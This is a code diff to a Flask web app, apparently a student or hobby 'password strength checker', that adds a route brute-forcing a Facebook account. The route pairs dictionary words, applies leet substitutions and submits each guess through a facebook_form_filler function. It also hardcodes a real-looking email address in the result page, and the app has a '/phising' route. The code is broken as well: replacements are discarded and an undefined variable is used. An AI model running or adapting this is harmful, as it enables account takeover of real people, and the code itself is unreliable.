@@ -39,15 +39,40 @@ def passwordstrengthchecker():
     return render_template('passwordstrengthchecker.html')
 @app.route('/run_hybrid', methods = ['POST', 'GET'])
 def hybrid_alg():
-    con = sqlite3.connect("passwords1.db")
-    con.row_factory = sqlite3.Row
-    cur = con.cursor()
-    cur.execute("select * from PASSWORDS")
-    rows = cur.fetchall()
-    form = request.form
-    username = request.form['accusername']
-    website = request.form['website']
-    return render_template('hybrid.html')
+    username = request.form["accusername"]
+    dictionaryChunk = request.form["dictionary"]
+    dictionary = dictionaryChunk.split()
+    i = 0; 
+    while i < len(dictionary):
+        firstword = dictionary[i]
+        j = i + 1;
+        while j < len(dictionary):
+            secondword = dictionary[j]
+            comboword = firstword + secondword
+
+            if 's' in comboword:
+                comboword.replace('s', '$')
+            if 'e' in comboword:
+                comboword.replace('e', '3')
+            if 'l' in comboword:
+                comboword.replace('l', '1')
+            if 'a' in comboword:
+                comboword.replace('a', '@')
+            if 'o' in comboword:
+                comboword.replace('o', '0')
+
+        
+            found = facebook_form_filler(username, comboword)
+            if found:
+                password = word
+                break
+
+            j = j+1
+        i = i +1
+    if password != None:
+        return render_template('result.html',username = "tarabite@yahoo.com", password = password)
+    else:
+        return render_template('500_bf.html')
 @app.route('/phising')
 def phising():
     return render_template('phising.html')
